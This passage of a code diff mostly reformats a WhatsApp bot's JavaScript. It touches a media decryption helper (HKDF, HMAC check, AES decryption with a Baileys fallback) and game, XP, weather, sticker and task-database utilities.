+    const __hkdf = (key, len, info) => {
+      const prk = __crypto
+        .createHmac("sha256", Buffer.alloc(32, 0))
+        .update(key)
+        .digest();
+      let okm = Buffer.alloc(0),
+        prev = Buffer.alloc(0),
+        c = 1;
+      while (okm.length < len) {
+        const h = __crypto.createHmac("sha256", prk);
+        h.update(prev);
+        h.update(Buffer.from(info, "utf-8"));
+        h.update(Buffer.from([c]));
+        prev = h.digest();
+        okm = Buffer.concat([okm, prev]);
+        c++;
+      }
+      return okm.slice(0, len);
+    };
+    const __appInfo = (m) => {
+      const t = (m || "").split(";")[0].trim().toLowerCase();
+      if (t.startsWith("image/")) return "WhatsApp Image Keys";
+      if (t.startsWith("video/")) return "WhatsApp Video Keys";
+      if (t.startsWith("audio/")) return "WhatsApp Audio Keys";
+      return "WhatsApp Document Keys";
+    };
+    const __msgType = (m) => {
+      const t = (m || "").split(";")[0].trim().toLowerCase();
+      if (t === "image/webp") return "stickerMessage";
+      if (t.startsWith("image/")) return "imageMessage";
+      if (t.startsWith("video/")) return "videoMessage";
+      if (t.startsWith("audio/")) return "audioMessage";
+      return "documentMessage";
+    };
+    const __detect = (b) => {
+      // real type from magic bytes
+      if (
+        b.length > 12 &&
+        b[0] === 0x52 &&
+        b[1] === 0x49 &&
+        b[2] === 0x46 &&
+        b[3] === 0x46 &&
+        b.slice(8, 12).toString() === "WEBP"
+      )
+        return { mimetype: "image/webp", ext: "webp" };
+      if (b[0] === 0xff && b[1] === 0xd8 && b[2] === 0xff)
+        return { mimetype: "image/jpeg", ext: "jpg" };
+      if (b[0] === 0x89 && b[1] === 0x50 && b[2] === 0x4e && b[3] === 0x47)
+        return { mimetype: "image/png", ext: "png" };
+      if (b.slice(0, 3).toString() === "GIF")
+        return { mimetype: "image/gif", ext: "gif" };
+      if (b.length > 12 && b.slice(4, 8).toString() === "ftyp")
+        return { mimetype: "video/mp4", ext: "mp4" };
+      if (b.slice(0, 4).toString() === "OggS")
+        return { mimetype: "audio/ogg", ext: "ogg" };
+      if (
+        b.slice(0, 3).toString() === "ID3" ||
+        (b[0] === 0xff && (b[1] & 0xe0) === 0xe0)
+      )
+        return { mimetype: "audio/mpeg", ext: "mp3" };
+      if (b.slice(0, 4).toString() === "%PDF")
+        return { mimetype: "application/pdf", ext: "pdf" };
+      return {
+        mimetype: mediaMimetype,
+        ext: (mediaMimetype || "").split("/")[1]?.split(";")[0] || "bin",
+      };
+    };
+    const __tag = (plain) => {
+      // attach detected type (non-breaking) + warn on mismatch
+      const det = __detect(plain);
+      try {
+        plain.detectedMimetype = det.mimetype;
+        plain.detectedExt = det.ext;
+      } catch (_) {
+        /* ignore */
+      }
+      const declared = (mediaMimetype || "").split(";")[0].trim().toLowerCase();
+      if (declared && det.mimetype !== declared) {
+        console.warn(
+          `⚠️ mimetype mismatch: declared "${declared}" but bytes are "${det.mimetype}" — save/send as .${det.ext}, not as declared type (wrong type renders BLACK/broken)`,
+        );
+      }
+      return plain;
+    };
+    // ------------------------------------------------------------------
 
-        const keyBuf = __asBuf(mediaKey);
-        if (!keyBuf || keyBuf.length !== 32) {
-            throw new Error(`Invalid mediaKey (len=${keyBuf?.length}, expected 32). Check caller pre-buffering.`);
-        }
-
-        const __u = new URL(mediaUrl);
-        const __directPath = __u.pathname + __u.search; // query (?ccb&oh&oe) is REQUIRED auth — never ''
-
-        // download encrypted bytes (plain HTTPS GET works for BOTH hosts)
-        const encRes = await axios.get(mediaUrl, {
-            responseType: 'arraybuffer',
-            timeout: 30000,
-            headers: { Origin: 'https://web.whatsapp.com', 'User-Agent': 'Mozilla/5.0', Accept: '*/*' }
-        });
-        const encBuffer = Buffer.from(encRes.data);
-        if (encBuffer.length <= 10) throw new Error(`Download too short (${encBuffer.length} bytes) — URL expired or blocked`);
-
-        // ---- primary: manual decrypt (bypasses the fork's URL bug entirely) ----
-        try {
-            const expanded = __hkdf(keyBuf, 112, __appInfo(mediaMimetype));
-            const iv = expanded.slice(0, 16);
-            const cipherKey = expanded.slice(16, 48);
-            const macKey = expanded.slice(48, 80);
-            const ciphertext = encBuffer.slice(0, encBuffer.length - 10);
-            const mac = encBuffer.slice(encBuffer.length - 10);
-            const calc = __crypto.createHmac('sha256', macKey).update(iv).update(ciphertext).digest().slice(0, 10);
-            if (!calc.equals(mac)) throw new Error('MAC mismatch — wrong mediaKey bytes or corrupt download');
-            const decipher = __crypto.createDecipheriv('aes-256-cbc', cipherKey, iv);
-            const plain = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
-            const expPlain = __asBuf(mediaFileSha256);
-            if (expPlain && expPlain.length === 32 && !__crypto.createHash('sha256').update(plain).digest().equals(expPlain)) {
-                console.warn('⚠️ fileSha256 mismatch after decrypt');
-            }
-            return __tag(plain);
-        } catch (manualErr) {
-            console.warn('⚠️ Manual decrypt failed, falling back to Baileys:', manualErr.message);
-            if (typeof downloadMediaMessage !== 'function') throw manualErr;
-        }
-
-        // ---- fallback: Baileys with FORK-CORRECT fakeMsg ----
-        // This fork uses `url` ONLY for mmg hosts, else `https://mmg.whatsapp.net${directPath}`.
-        // So directPath must be the REAL path (mmg CDN serves both path styles by path).
-        const type = (typeof getMessageType === 'function' ? getMessageType(mediaMimetype) : __msgType(mediaMimetype));
-        const fakeMsg = {
-            key: { remoteJid: 'status@broadcast', fromMe: true, id: messageId || `fake-${Date.now()}` },
-            message: {}
-        };
-        fakeMsg.message[type] = {
-            mimetype: mediaMimetype,
-            url: mediaUrl,
-            directPath: __directPath, // <-- THE FIX for media.*.fna URLs (was '')
-            mediaKey: keyBuf,
-            fileEncSha256: __asBuf(mediaFileEncSha256),
-            fileSha256: __asBuf(mediaFileSha256)
-        };
-        const out = await downloadMediaMessage(fakeMsg, 'buffer', {}, {
-            logger: client?.logger,
-            reuploadRequest: client?.updateMediaMessage
-        });
-        return __tag(Buffer.from(out));
-    } catch (err) {
-        console.error('❌ Media decrypt failed:', err.message);
-        throw err;
+    const keyBuf = __asBuf(mediaKey);
+    if (!keyBuf || keyBuf.length !== 32) {
+      throw new Error(
+        `Invalid mediaKey (len=${keyBuf?.length}, expected 32). Check caller pre-buffering.`,
+      );
     }
-}
 
+    const __u = new URL(mediaUrl);
+    const __directPath = __u.pathname + __u.search; // query (?ccb&oh&oe) is REQUIRED auth — never ''
+
+    // download encrypted bytes (plain HTTPS GET works for BOTH hosts)
+    const encRes = await axios.get(mediaUrl, {
+      responseType: "arraybuffer",
+      timeout: 30000,
+      headers: {
+        Origin: "https://web.whatsapp.com",
+        "User-Agent": "Mozilla/5.0",
+        Accept: "*/*",
+      },
+    });
+    const encBuffer = Buffer.from(encRes.data);
+    if (encBuffer.length <= 10)
+      throw new Error(
+        `Download too short (${encBuffer.length} bytes) — URL expired or blocked`,
+      );
+
+    // ---- primary: manual decrypt (bypasses the fork's URL bug entirely) ----
+    try {
+      const expanded = __hkdf(keyBuf, 112, __appInfo(mediaMimetype));
+      const iv = expanded.slice(0, 16);
+      const cipherKey = expanded.slice(16, 48);
+      const macKey = expanded.slice(48, 80);
+      const ciphertext = encBuffer.slice(0, encBuffer.length - 10);
+      const mac = encBuffer.slice(encBuffer.length - 10);
+      const calc = __crypto
+        .createHmac("sha256", macKey)
+        .update(iv)
+        .update(ciphertext)
+        .digest()
+        .slice(0, 10);
+      if (!calc.equals(mac))
+        throw new Error(
+          "MAC mismatch — wrong mediaKey bytes or corrupt download",
+        );
+      const decipher = __crypto.createDecipheriv("aes-256-cbc", cipherKey, iv);
+      const plain = Buffer.concat([
+        decipher.update(ciphertext),
+        decipher.final(),
+      ]);
+      const expPlain = __asBuf(mediaFileSha256);
+      if (
+        expPlain &&
+        expPlain.length === 32 &&
+        !__crypto.createHash("sha256").update(plain).digest().equals(expPlain)
+      ) {
+        console.warn("⚠️ fileSha256 mismatch after decrypt");
+      }
+      return __tag(plain);
+    } catch (manualErr) {
+      console.warn(
+        "⚠️ Manual decrypt failed, falling back to Baileys:",
+        manualErr.message,
+      );
+      if (typeof downloadMediaMessage !== "function") throw manualErr;
+    }
+
+    // ---- fallback: Baileys with FORK-CORRECT fakeMsg ----
+    // This fork uses `url` ONLY for mmg hosts, else `https://mmg.whatsapp.net${directPath}`.
+    // So directPath must be the REAL path (mmg CDN serves both path styles by path).
+    const type =
+      typeof getMessageType === "function"
+        ? getMessageType(mediaMimetype)
+        : __msgType(mediaMimetype);
+    const fakeMsg = {
+      key: {
+        remoteJid: "status@broadcast",
+        fromMe: true,
+        id: messageId || `fake-${Date.now()}`,
+      },
+      message: {},
+    };
+    fakeMsg.message[type] = {
+      mimetype: mediaMimetype,
+      url: mediaUrl,
+      directPath: __directPath, // <-- THE FIX for media.*.fna URLs (was '')
+      mediaKey: keyBuf,
+      fileEncSha256: __asBuf(mediaFileEncSha256),
+      fileSha256: __asBuf(mediaFileSha256),
+    };
+    const out = await downloadMediaMessage(
+      fakeMsg,
+      "buffer",
+      {},
+      {
+        logger: client?.logger,
+        reuploadRequest: client?.updateMediaMessage,
+      },
+    );
+    return __tag(Buffer.from(out));
+  } catch (err) {
+    console.error("❌ Media decrypt failed:", err.message);
+    throw err;
+  }
+}
 
 // Function to load the Hangman data from the JSON file
 function loadHangmanData() {
-    if (!fs.existsSync(hangmanFile)) fs.writeFileSync(hangmanFile, "{}");
-    return JSON.parse(fs.readFileSync(hangmanFile));
+  if (!fs.existsSync(hangmanFile)) fs.writeFileSync(hangmanFile, "{}");
+  return JSON.parse(fs.readFileSync(hangmanFile));
 }
-let hangmanData = loadHangmanData();
+const hangmanData = loadHangmanData();
 // Function to save the Hangman data to the JSON file
 function saveHangmanData(data) {
-    fs.writeFileSync(hangmanFile, JSON.stringify(data, null, 2));
+  fs.writeFileSync(hangmanFile, JSON.stringify(data, null, 2));
 }
 
 function loadquestionsss() {
-    if (!fs.existsSync(questionsFile)) fs.writeFileSync(questionsFile, "{}");
-    return JSON.parse(fs.readFileSync(questionsFile));
+  if (!fs.existsSync(questionsFile)) fs.writeFileSync(questionsFile, "{}");
+  return JSON.parse(fs.readFileSync(questionsFile));
 }
-let questionsss = loadquestionsss();
+const questionsss = loadquestionsss();
 
 function saveQuestionsData(data) {
-    fs.writeFileSync(questionsFile, JSON.stringify(data, null, 2));
+  fs.writeFileSync(questionsFile, JSON.stringify(data, null, 2));
 }
 
 function loadQanAdata() {
-    if (!fs.existsSync(QresponsesFile)) fs.writeFileSync(QresponsesFile, "{}");
-    return JSON.parse(fs.readFileSync(QresponsesFile));
+  if (!fs.existsSync(QresponsesFile)) fs.writeFileSync(QresponsesFile, "{}");
+  return JSON.parse(fs.readFileSync(QresponsesFile));
 }
-let QanAdata = loadQanAdata();
+const QanAdata = loadQanAdata();
 // Function to save the Hangman data to the JSON file
 function saveQanAdata(data) {
-    fs.writeFileSync(QresponsesFile, JSON.stringify(data, null, 2));
+  fs.writeFileSync(QresponsesFile, JSON.stringify(data, null, 2));
 }
 
 // Function to get the leaderboard
 function getLeaderboard(hangmanData) {
-    const leaderboard = Object.keys(hangmanData)
-        .map(user => ({
-            user: user,
-            wins: hangmanData[user].wins || 0,
-            name: hangmanData[user].name
-        }))
-        .sort((a, b) => b.wins - a.wins);
+  const leaderboard = Object.keys(hangmanData)
+    .map((user) => ({
+      user: user,
+      wins: hangmanData[user].wins || 0,
+      name: hangmanData[user].name,
+    }))
+    .sort((a, b) => b.wins - a.wins);
 
-    let leaderboardText = "🏆 *Hangman Leaderboard*\n";
-    if (leaderboard.length > 0) {
-        leaderboard.forEach((entry, index) => {
-            leaderboardText += `${index + 1}. ${entry.name} - Wins: ${entry.wins}\n`;
-        });
-    } else {
-        leaderboardText = "No players have won yet!";
-    }
+  let leaderboardText = "🏆 *Hangman Leaderboard*\n";
+  if (leaderboard.length > 0) {
+    leaderboard.forEach((entry, index) => {
+      leaderboardText += `${index + 1}. ${entry.name} - Wins: ${entry.wins}\n`;
+    });
+  } else {
+    leaderboardText = "No players have won yet!";
+  }
 
-    return leaderboardText;
+  return leaderboardText;
 }
 const getBuffer = async (url, options) => {
-    try {
-        options ? options : {}
-        const res = await axios({
-            method: "get",
-            url,
-            headers: {
-                'DNT': 1,
-                'Upgrade-Insecure-Request': 1
-            },
-            ...options,
-            responseType: 'arraybuffer'
-        })
-        return res.data
-    } catch (err) {
-        return err
-    }
-}
+  try {
+    options ? options : {};
+    const res = await axios({
+      method: "get",
+      url,
+      headers: {
+        DNT: 1,
+        "Upgrade-Insecure-Request": 1,
+      },
+      ...options,
+      responseType: "arraybuffer",
+    });
+    return res.data;
+  } catch (err) {
+    return err;
+  }
+};
 
 function loadUsers() {
-    try {
-        const data = fs.readFileSync(USER_DATA_FILE, 'utf8');
-        return JSON.parse(data);
-    } catch (error) {
-        //console.error("Error loading user data:", error);
-        return {
-            users: {}
-        }; // Return an empty object if file doesn't exist
-    }
+  try {
+    const data = fs.readFileSync(USER_DATA_FILE, "utf8");
+    return JSON.parse(data);
+  } catch (error) {
+    //console.error("Error loading user data:", error);
+    return {
+      users: {},
+    }; // Return an empty object if file doesn't exist
+  }
 }
 
 // Save user data to JSON file
 function saveUsers(data) {
-    fs.writeFileSync(USER_DATA_FILE, JSON.stringify(data, null, 4), 'utf8');
-    //console.log("User data saved:", data);
+  fs.writeFileSync(USER_DATA_FILE, JSON.stringify(data, null, 4), "utf8");
+  //console.log("User data saved:", data);
 }
 
 function getLevel(userId) {
-    const data = loadUsers();
+  const data = loadUsers();
 
-    if (!data.users[userId]) {
-        data.users[userId] = {
-            level: 1,
-            xp: 0,
-            xp_needed: 100
-        };
-    }
+  if (!data.users[userId]) {
+    data.users[userId] = {
+      level: 1,
+      xp: 0,
+      xp_needed: 100,
+    };
+  }
 
-    return data.users[userId].level;
+  return data.users[userId].level;
 }
-
-
 
 function addXP(userId) {
-    const data = loadUsers();
+  const data = loadUsers();
 
-    // If the user doesn't exist, create a new entry
-    if (!data.users[userId]) {
-        data.users[userId] = {
-            level: 1,
-            xp: 0,
-            xp_needed: 100
-        };
-    }
+  // If the user doesn't exist, create a new entry
+  if (!data.users[userId]) {
+    data.users[userId] = {
+      level: 1,
+      xp: 0,
+      xp_needed: 100,
+    };
+  }
 
-    // Add 5 XP to the user
-    data.users[userId].xp += 5;
+  // Add 5 XP to the user
+  data.users[userId].xp += 5;
 
-    // Check if the user needs to level up
-    while (data.users[userId].xp >= data.users[userId].xp_needed) {
-        // Level up
-        data.users[userId].xp -= data.users[userId].xp_needed;
-        data.users[userId].level += 1;
-        // Increase xp_needed for next level (e.g., 20% more XP needed per level)
-        data.users[userId].xp_needed = Math.floor(data.users[userId].xp_needed * 1.2);
-    }
+  // Check if the user needs to level up
+  while (data.users[userId].xp >= data.users[userId].xp_needed) {
+    // Level up
+    data.users[userId].xp -= data.users[userId].xp_needed;
+    data.users[userId].level += 1;
+    // Increase xp_needed for next level (e.g., 20% more XP needed per level)
+    data.users[userId].xp_needed = Math.floor(
+      data.users[userId].xp_needed * 1.2,
+    );
+  }
 
-    saveUsers(data);
-    return `XP: ${data.users[userId].xp}/${data.users[userId].xp_needed} | Level: ${data.users[userId].level}`;
+  saveUsers(data);
+  return `XP: ${data.users[userId].xp}/${data.users[userId].xp_needed} | Level: ${data.users[userId].level}`;
 }
-
-
-
 
 const userWaitingForQuizJSON = new Map(); // Key: JID, Value: true
 
 // Helper function for JSON validation
 function isValidQuizFormat(data) {
-    if (!Array.isArray(data) || data.length === 0) return false;
-    for (const q of data) {
-        if (!q.question || !Array.isArray(q.options) || q.options.length === 0 || typeof q.answer !== 'number') {
-            return false;
-        }
+  if (!Array.isArray(data) || data.length === 0) return false;
+  for (const q of data) {
+    if (
+      !q.question ||
+      !Array.isArray(q.options) ||
+      q.options.length === 0 ||
+      typeof q.answer !== "number"
+    ) {
+      return false;
     }
-    return true;
+  }
+  return true;
 }
 
-
-
-
 function generateWeatherSummary(temperature, windspeed, winddirection) {
-    // Define the temperature description
-    let temperatureDesc;
-    if (temperature < 0) {
-        temperatureDesc = "It's freezing cold!";
-    } else if (temperature >= 0 && temperature <= 15) {
-        temperatureDesc = "It's chilly.";
-    } else if (temperature > 15 && temperature <= 25) {
-        temperatureDesc = "The weather is mild.";
-    } else if (temperature > 25 && temperature <= 35) {
-        temperatureDesc = "It's quite warm.";
-    } else {
-        temperatureDesc = "It's hot outside!";
-    }
+  // Define the temperature description
+  let temperatureDesc;
+  if (temperature < 0) {
+    temperatureDesc = "It's freezing cold!";
+  } else if (temperature >= 0 && temperature <= 15) {
+    temperatureDesc = "It's chilly.";
+  } else if (temperature > 15 && temperature <= 25) {
+    temperatureDesc = "The weather is mild.";
+  } else if (temperature > 25 && temperature <= 35) {
+    temperatureDesc = "It's quite warm.";
+  } else {
+    temperatureDesc = "It's hot outside!";
+  }
 
-    // Define the wind description
-    let windDesc;
-    if (windspeed < 10) {
-        windDesc = "There's a light breeze.";
-    } else if (windspeed >= 10 && windspeed <= 30) {
-        windDesc = "The wind is moderate.";
-    } else {
-        windDesc = "It's very windy!";
-    }
+  // Define the wind description
+  let windDesc;
+  if (windspeed < 10) {
+    windDesc = "There's a light breeze.";
+  } else if (windspeed >= 10 && windspeed <= 30) {
+    windDesc = "The wind is moderate.";
+  } else {
+    windDesc = "It's very windy!";
+  }
 
-    // Define the wind direction description
-    let windDirectionDesc;
-    if (winddirection >= 0 && winddirection <= 45) {
-        windDirectionDesc = "The wind is coming from the north-east.";
-    } else if (winddirection > 45 && winddirection <= 135) {
-        windDirectionDesc = "The wind is coming from the east.";
-    } else if (winddirection > 135 && winddirection <= 225) {
-        windDirectionDesc = "The wind is coming from the south-east.";
-    } else if (winddirection > 225 && winddirection <= 315) {
-        windDirectionDesc = "The wind is coming from the south-west.";
-    } else {
-        windDirectionDesc = "The wind is coming from the west.";
-    }
+  // Define the wind direction description
+  let windDirectionDesc;
+  if (winddirection >= 0 && winddirection <= 45) {
+    windDirectionDesc = "The wind is coming from the north-east.";
+  } else if (winddirection > 45 && winddirection <= 135) {
+    windDirectionDesc = "The wind is coming from the east.";
+  } else if (winddirection > 135 && winddirection <= 225) {
+    windDirectionDesc = "The wind is coming from the south-east.";
+  } else if (winddirection > 225 && winddirection <= 315) {
+    windDirectionDesc = "The wind is coming from the south-west.";
+  } else {
+    windDirectionDesc = "The wind is coming from the west.";
+  }
 
-    // Combine all parts into a final summary
-    const weatherSummary = `*Weather* *Summary:*
+  // Combine all parts into a final summary
+  const weatherSummary = `*Weather* *Summary:*
 *-* *Temperature:* *${temperature}°C (${temperatureDesc})*
 *-* *Wind Speed:* *${windspeed}* *km/h* *(${windDesc})*
 *-* *Wind* *Direction:* *${windDirectionDesc}* *(Direction:* *${winddirection}°)*`;
 
-    return weatherSummary;
+  return weatherSummary;
 }
-
 
 async function convertToSticker(imagePath, stickerPath) {
-    await sharp(imagePath)
-        .resize({
-            width: 512,
-            height: 512,
-            fit: 'inside',
-            withoutEnlargement: true
-        }) // Resize the image to 512x512 as required for stickers
+  await sharp(imagePath)
+    .resize({
+      width: 512,
+      height: 512,
+      fit: "inside",
+      withoutEnlargement: true,
+    }) // Resize the image to 512x512 as required for stickers
 
-        .webp({
-            quality: 100,
-            lossless: true
-        }) // Convert to WebP format
-        .toFile(stickerPath);
-    console.log(`Image converted to sticker: ${stickerPath}`);
+    .webp({
+      quality: 100,
+      lossless: true,
+    }) // Convert to WebP format
+    .toFile(stickerPath);
+  console.log(`Image converted to sticker: ${stickerPath}`);
 }
-
 
 /**
  * Auto box generator keeping your top & separator
  * @param {string} text - content inside the box
  * @param {number} width - width of box content (inside borders)
  */
-function generateBox(text = '') {
-    text = String(text || '');
-    const width = 21; // default box width
-    const title = '🎀  𝒜𝐿𝐸𝒳𝒜 - 𝓥3 🎀';
-    const defaultTitleWidth = 21;
+function generateBox(text = "") {
+  text = String(text || "");
+  const width = 21; // default box width
+  const title = "🎀  𝒜𝐿𝐸𝒳𝒜 - 𝓥3 🎀";
+  const defaultTitleWidth = 21;
 
-    // Top and separator
-    const top = '╭' + '━'.repeat(width + 2) + '╮';
-    const separator = '┃' + '━'.repeat(width + 2) + '┃';
+  // Top and separator
+  const top = "╭" + "━".repeat(width + 2) + "╮";
+  const separator = "┃" + "━".repeat(width + 2) + "┃";
 
-    // Center title in default width (21) and fill remaining space
-    const leftPadding = Math.floor((defaultTitleWidth - title.length) / 2);
-    const remainingWidth = width - defaultTitleWidth;
-    const titleLine = `┃                🎀 𝒜𝐿𝐸𝒳𝒜 - 𝓥3  🎀                 ┃`;
+  // Center title in default width (21) and fill remaining space
+  const leftPadding = Math.floor((defaultTitleWidth - title.length) / 2);
+  const remainingWidth = width - defaultTitleWidth;
+  const titleLine = `┃                🎀 𝒜𝐿𝐸𝒳𝒜 - 𝓥3  🎀                 ┃`;
 
-    // Split text into wrapped lines
-    const lines = [];
-    text.split('\n').forEach(rawLine => {
-        const words = rawLine.split(' ');
-        let line = '';
-        for (const word of words) {
-            if ((line + word).length + 1 > width) {
-                lines.push(line.trim());
-                line = word + ' ';
-            } else {
-                line += word + ' ';
-            }
-        }
-        if (line.trim()) lines.push(line.trim());
-    });
+  // Split text into wrapped lines
+  const lines = [];
+  text.split("\n").forEach((rawLine) => {
+    const words = rawLine.split(" ");
+    let line = "";
+    for (const word of words) {
+      if ((line + word).length + 1 > width) {
+        lines.push(line.trim());
+        line = word + " ";
+      } else {
+        line += word + " ";
+      }
+    }
+    if (line.trim()) lines.push(line.trim());
+  });
 
-    // Start line only, no end padding
-    const contentLines = lines.map(l => `┃ ${l}`);
+  // Start line only, no end padding
+  const contentLines = lines.map((l) => `┃ ${l}`);
 
-    const bottom = '╰' + '━'.repeat(width + 2) + '╯';
+  const bottom = "╰" + "━".repeat(width + 2) + "╯";
 
-    return [top, titleLine, separator, ...contentLines, bottom].join('\n');
+  return [top, titleLine, separator, ...contentLines, bottom].join("\n");
 }
 
 function generateRandomToken(length = 15, sender, pushName) {
-    const characters = `${sender}img${pushName}`;
-    let token = '';
+  const characters = `${sender}img${pushName}`;
+  let token = "";
 
-    for (let i = 0; i < length; i++) {
-        // Randomly select a character from the characters string
-        const randomChar = characters.charAt(Math.floor(Math.random() * characters.length));
-        token += randomChar;
-    }
+  for (let i = 0; i < length; i++) {
+    // Randomly select a character from the characters string
+    const randomChar = characters.charAt(
+      Math.floor(Math.random() * characters.length),
+    );
+    token += randomChar;
+  }
 
-    return token;
+  return token;
 }
 
-const util = require('util');
-
+const util = require("util");
 
 //console.log('🖥️', cpuData)
 //console.log('𝐑𝐚𝐦', Math.round(memUsed/1e+9) , 'GB of', memTotal)
-const moment = require('moment-timezone');
-const {
-    response
-} = require('express');
-const {
-    ConsoleMessage
-} = require('puppeteer');
-const {
-    url
-} = require('inspector');
-const {
-    json
-} = require('stream/consumers');
-const {
-    image
-} = require('ascii-art');
-const {
-    error,
-    Console,
-    group
-} = require('console');
-const {
-    title
-} = require('process');
-
+const moment = require("moment-timezone");
+const { response } = require("express");
+const { ConsoleMessage } = require("puppeteer");
+const { url } = require("inspector");
+const { json } = require("stream/consumers");
+const { image } = require("ascii-art");
+const { error, Console, group } = require("console");
+const { title } = require("process");
 
 function getGreeting() {
-    const hour = moment().tz("Asia/Colombo").hour();
-    return (hour >= 5 && hour < 12) && "Good Morning ☀️" ||
-        (hour >= 12 && hour < 17) && "Good Afternoon ☀️" ||
-        (hour >= 17 && hour < 20) && "Good Evening 🌆" ||
-        "Good Night 🌙";
+  const hour = moment().tz("Asia/Colombo").hour();
+  return (
+    (hour >= 5 && hour < 12 && "Good Morning ☀️") ||
+    (hour >= 12 && hour < 17 && "Good Afternoon ☀️") ||
+    (hour >= 17 && hour < 20 && "Good Evening 🌆") ||
+    "Good Night 🌙"
+  );
 }
-
-
-
-
 
 const db = database.getPool();
 
 (async () => {
-    try {
-        await database.initialize();
-        await economy.initTables(db);
-        await shop.initTables(db);
-        await rpg.initTables(db);
-        console.log('[GamesAddon] Database, account/profile, economy, shop and RPG tables are ready.');
-    } catch (err) {
-
-        console.error('[GamesAddon] Failed to initialize MySQL tables:', err.message);
-    }
+  try {
+    await database.initialize();
+    await economy.initTables(db);
+    await shop.initTables(db);
+    await rpg.initTables(db);
+    console.log(
+      "[GamesAddon] Database, account/profile, economy, shop and RPG tables are ready.",
+    );
+  } catch (err) {
+    console.error(
+      "[GamesAddon] Failed to initialize MySQL tables:",
+      err.message,
+    );
+  }
 })();
-
-
 
 const conversations = {};
 
-
-
-
 fs.ensureDirSync(TEMP_DIR);
 
-
-
-
-
-
-
-
 async function getTasks(user_id) {
-
-    try {
-        const query = `SELECT * FROM \`tasks\` WHERE user_id = ?`;
-        const [results] = await db.promise().query(query, [user_id]);
-        return results;
-    } catch (err) {
-        console.error('Error querying the database:', err);
-        return false;
-    }
+  try {
+    const query = `SELECT * FROM \`tasks\` WHERE user_id = ?`;
+    const [results] = await db.promise().query(query, [user_id]);
+    return results;
+  } catch (err) {
+    console.error("Error querying the database:", err);
+    return false;
+  }
 }
 
-
-
-
-
-
 async function getdpurl(AlexaInc, userid) {
+  try {
+    const ppUrl = await AlexaInc.profilePictureUrl(userid, "image");
 
-    try {
-        const ppUrl = await AlexaInc.profilePictureUrl(userid, 'image');
-
-        return ppUrl;
-
-    } catch (e) {
-        console.log(e)
-        return null;
-    }
-
+    return ppUrl;
+  } catch (e) {
+    console.log(e);
+    return null;
+  }
 }
 
 function parseWhatsAppFormatting(text) {
-    if (!text) return { cleanText: "", entities: [] };
+  if (!text) return { cleanText: "", entities: [] };
 
-    // Format Regex Map
-    const rules = [
-        { type: "pre", regex: /```([\s\S]+?)```/g },
-        { type: "code", regex: /`([^`\n]+?)`/g },
-        { type: "bold", regex: /(?<=^|[^\w*])\*([^\n*]+?)\*(?=$|[^\w*])/g },
-        { type: "italic", regex: /(?<=^|[^\w_])_([^\n_]+?)_(?=$|[^\w_])/g },
-        { type: "strikethrough", regex: /(?<=^|[^\w~])~([^\n~]+?)~(?=$|[^\w~])/g },
-    ];
+  // Format Regex Map
+  const rules = [
+    { type: "pre", regex: /```([\s\S]+?)```/g },
+    { type: "code", regex: /`([^`\n]+?)`/g },
+    { type: "bold", regex: /(?<=^|[^\w*])\*([^\n*]+?)\*(?=$|[^\w*])/g },
+    { type: "italic", regex: /(?<=^|[^\w_])_([^\n_]+?)_(?=$|[^\w_])/g },
+    { type: "strikethrough", regex: /(?<=^|[^\w~])~([^\n~]+?)~(?=$|[^\w~])/g },
+  ];
 
-    const matches = [];
+  const matches = [];
 
-    // formating matches
-    for (const rule of rules) {
-        let match;
-        while ((match = rule.regex.exec(text)) !== null) {
-            matches.push({
-                type: rule.type,
-                start: match.index,
-                end: match.index + match[0].length,
-                innerStart: match.index + (rule.type === "pre" ? 3 : 1),
-                innerEnd: match.index + match[0].length - (rule.type === "pre" ? 3 : 1),
-                rawText: match[0],
-                innerText: match[1],
-            });
-        }
+  // formating matches
+  for (const rule of rules) {
+    let match;
+    while ((match = rule.regex.exec(text)) !== null) {
+      matches.push({
+        type: rule.type,
+        start: match.index,
+        end: match.index + match[0].length,
+        innerStart: match.index + (rule.type === "pre" ? 3 : 1),
+        innerEnd: match.index + match[0].length - (rule.type === "pre" ? 3 : 1),
+        rawText: match[0],
+        innerText: match[1],
+      });
     }
+  }
 
-    // Overlappingprevent
-    matches.sort((a, b) => a.start - b.start);
+  // Overlappingprevent
+  matches.sort((a, b) => a.start - b.start);
 
-    let cleanText = "";
-    const entities = [];
-    let lastIndex = 0;
+  let cleanText = "";
+  const entities = [];
+  let lastIndex = 0;
 
-    for (const m of matches) {
-        // Overlapping tags මගහැරීම
-        if (m.start < lastIndex) continue;
+  for (const m of matches) {
+    // Overlapping tags මගහැරීම
+    if (m.start < lastIndex) continue;
 
-        // Formatting st
-        cleanText += text.slice(lastIndex, m.start);
+    // Formatting st
+    cleanText += text.slice(lastIndex, m.start);
 
-        const entityOffset = cleanText.length;
-        const entityLength = m.innerText.length;
+    const entityOffset = cleanText.length;
+    const entityLength = m.innerText.length;
 
-        cleanText += m.innerText;
+    cleanText += m.innerText;
 
-        entities.push({
-            type: m.type,
-            offset: entityOffset,
-            length: entityLength,
-        });
+    entities.push({
+      type: m.type,
+      offset: entityOffset,
+      length: entityLength,
+    });
 
-        lastIndex = m.end;
-    }
+    lastIndex = m.end;
+  }
 
-    cleanText += text.slice(lastIndex);
+  cleanText += text.slice(lastIndex);
 
-    return { cleanText, entities };
+  return { cleanText, entities };
 }
 
-
 async function updateTaskStatus(user_id, taskName, newStatus) {
-    try {
-        const tasks = await getTasks(user_id);
-        if (!tasks.length) {
-            return 'No tasks found';
-
-        }
-        let taskList = JSON.parse(tasks[0].tasks);
-        const task = taskList.find(t => t.task === taskName);
-        if (task) {
-            task.status = newStatus;
-            const updatedTasks = JSON.stringify(taskList);
-            const updateQuery = `UPDATE \`tasks\` SET tasks = ? WHERE user_id = ?`;
-            await db.promise().query(updateQuery, [updatedTasks, user_id]);
-
-            return 'Task status updated successfully';
-        } else {
-            return 'Task not found this name';
-        }
-    } catch (err) {
-
-        return `\`system erroer try again later:\`${err}`
+  try {
+    const tasks = await getTasks(user_id);
+    if (!tasks.length) {
+      return "No tasks found";
     }
+    const taskList = JSON.parse(tasks[0].tasks);
+    const task = taskList.find((t) => t.task === taskName);
+    if (task) {
+      task.status = newStatus;
+      const updatedTasks = JSON.stringify(taskList);
+      const updateQuery = `UPDATE \`tasks\` SET tasks = ? WHERE user_id = ?`;
+      await db.promise().query(updateQuery, [updatedTasks, user_id]);
+
+      return "Task status updated successfully";
+    } else {
+      return "Task not found this name";
+    }
+  } catch (err) {
+    return `\`system erroer try again later:\`${err}`;
+  }
 }
 
 async function addNewTask(user_id, newTask) {
-    try {
-        const tasks = await getTasks(user_id);
